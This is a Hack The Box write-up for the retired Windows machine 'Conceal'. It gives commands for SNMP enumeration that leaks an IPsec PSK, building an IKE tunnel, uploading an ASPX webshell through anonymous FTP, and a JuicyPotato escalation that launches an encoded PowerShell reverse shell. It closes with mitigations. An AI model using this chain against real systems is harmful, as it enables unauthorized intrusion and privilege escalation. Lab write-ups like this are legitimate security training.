---
machine: Conceal
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, snmp, ipsec, ike, ftp, webshell, juicypotato]
---

# Conceal — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SNMP with community `public` leaks the IPsec PSK. After connecting over IKE/IPsec, anonymous writable FTP is found, an ASPX webshell is uploaded and a shell is obtained. `SeImpersonatePrivilege` enables JuicyPotato to SYSTEM.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sU -p161,500 --script snmp-info <IP>
snmpwalk -v2c -c public <IP>
```

SNMP returns the IPsec PSK in an enterprise OID. Identify the gateway and prepare `strongSwan`/`ike-scan`.

## IPsec connection

```bash
ike-scan -A <IP>
```

With the PSK and IKE parameters, configure `ipsec.conf` and bring the tunnel up:

```bash
sudo ipsec up conceal
```

Inside the network, rescan and FTP, HTTP and SMB appear.

## Initial access

FTP allows anonymous login and write access. The web server serves the same directory. Upload an ASPX webshell:

```bash
ftp <IP>
put shell.aspx
curl 'http://<IP>/shell.aspx?cmd=whoami'
```

This returns a shell as the service user.

## Escalation to SYSTEM

```powershell
whoami /priv
```

`SeImpersonatePrivilege` is enabled. Upload JuicyPotato and run it with a valid CLSID:

```powershell
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c powershell -e <payload>" -t * -c <CLSID>
```

The resulting reverse shell is SYSTEM. Read and redact the flag.

## Evidence

- `snmpwalk` with redacted PSK.
- `ipsec status` and internal connectivity.
- Webshell and initial shell.
- `whoami /priv` and JuicyPotato.

## Lessons learned

- SNMP can leak cryptographic material.
- An IPsec tunnel does not replace segmentation.
- Anonymous writable FTP sharing the webroot means RCE.
- `SeImpersonatePrivilege` remains direct escalation.

## Mitigation and detection

- Disable SNMP or use v3 with ACLs.
- Rotate PSKs and restrict IKE.
- Disable anonymous FTP and separate uploads from the webroot.
- Apply least privilege to service accounts and patch the OS.

## References

- <https://www.hackthebox.com/machines/conceal>
- <https://github.com/ohpe/juicy-potato>
- <https://www.strongswan.org/>
